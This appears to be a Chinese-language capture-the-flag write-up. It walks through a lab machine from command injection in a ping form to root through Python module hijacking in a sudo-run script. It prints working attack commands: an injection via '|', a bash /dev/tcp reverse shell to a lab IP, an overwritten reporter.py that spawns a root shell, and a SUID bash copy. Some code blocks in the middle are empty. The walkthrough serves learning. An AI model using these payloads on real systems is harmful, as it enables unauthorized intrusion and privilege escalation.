这台的设计很干净：入口是命令注入，提权是「sudo 脚本加载了组可写目录里的模块」，全程没有内核漏洞。

## 一、入口：ping 表单的命令注入

站点是个「网络诊断」门户，填 IP 就帮你 ping。源码逻辑：

```php
$cmd = "ping -c " . $count . " " . $target . " 2>&1";
$output = shell_exec($cmd);
```

黑名单只挡了两个字符：

```php
preg_match('/[;`]/', $target)
```

**`|` 没被挡。** 所以：

```bash
curl -s -X POST --data-urlencode "target=127.0.0.1|id" http://172.20.10.12/index.php
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

反弹 shell：

```bash
nc -lvnp 4444
# 目标端
127.0.0.1|bash -c 'bash -i >& /dev/tcp/172.20.10.13/4444 0>&1'
```


```php

```

两行同时出现才有意义：`Maintainer` 和 `SYSTEM_ADMIN` 都指向 clara，说明**这个人横跨应用层和系统层**，那么"数据库密码复用成系统密码"就值得一试。

```bash

# uid=1001(clara) groups=1002(clara),1001(devs)   ← 注意 devs 组
```

## 三、第二跳：sudo -l 只给了一个脚本

```
User clara may run the following commands on echo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/echo-report
```

大多数人看到"只有一个命令"就放弃了。正确的下一步是**读这个命令的源码**：

```python
sys.path.insert(0, "/opt/echo")
import reporter
...
reporter.run_report()
```

## 四、第三跳：模块劫持

`sys.path` 是 Python 找模块的搜索列表，**从第 0 位开始，第一个命中就停**。`insert(0, "/opt/echo")` 等于把这个目录排到最高优先级。

看权限：

```bash
ls -al /opt/echo
# drwxrwxr-x 3 root devs 4096 .            ← 目录，devs 组可写
# -rw-rw-r-- 1 root devs  356 reporter.py  ← 文件，devs 组可写
```

clara 在 devs 组 → **能改这个文件**。而 `sudo echo-report` 会以 root 身份 import 它。

```bash
cp /opt/echo/reporter.py /tmp/reporter.py.bak

cat > /opt/echo/reporter.py << 'PY'
import os

def run_report():
    os.system("/bin/bash")
PY

sudo /usr/local/bin/echo-report
id
# uid=0(root) gid=0(root) groups=0(root)
```

## 五、为什么"没有 run_report 也能成功"

如果只写两行：

```python
import os
os.system("/bin/bash")
```

程序会在后面报 `AttributeError: module 'reporter' has no attribute 'run_report'`，但 **shell 早就到手了**。

因为 Python 的**模块顶层代码在 `import` 那一刻就执行**，`reporter.run_report()` 是之后才调用的：

```
sudo echo-report
  → python 以 euid=0 启动
  → sys.path.insert(0, "/opt/echo")
  → import reporter      ← 这里就执行 os.system，已经是 root
  → main() 打印横幅
  → reporter.run_report() → AttributeError（无所谓）
```

这跟 PHP 里 `include` 一个只有 `exec("id");` 的文件一模一样：include 完命令就跑了，后面函数不存在也不影响。

## 六、为什么不用 PATH 劫持

原 `reporter.py` 里有 `subprocess.run(["free", "-h"])`，看着能在 `/tmp` 放个假 `free` 顶替。但 **sudo 默认启用 `secure_path`**，会把 PATH 重置成系统目录，塞 `/tmp` 无效。出题人故意堵了这条路。

## 七、两个实操坑

| 坑 | 说明 |
|---|---|
| `os.system("/bin/bash")` 在无 TTY 时卡住 | 反弹 shell 里没有终端，改成 `cp /bin/bash /tmp/x && chmod 4755 /tmp/x`，再 `/tmp/x -p` |
| SUID 加了但执行还是普通用户 | 查挂载选项：`findmnt -no OPTIONS /tmp`，如果有 `nosuid`，SUID 位不生效，换 `/home` 下的目录 |

`/tmp/x -p` 里的 `-p` 不能省，它让 bash 保留 euid，不然会主动降权回普通用户。
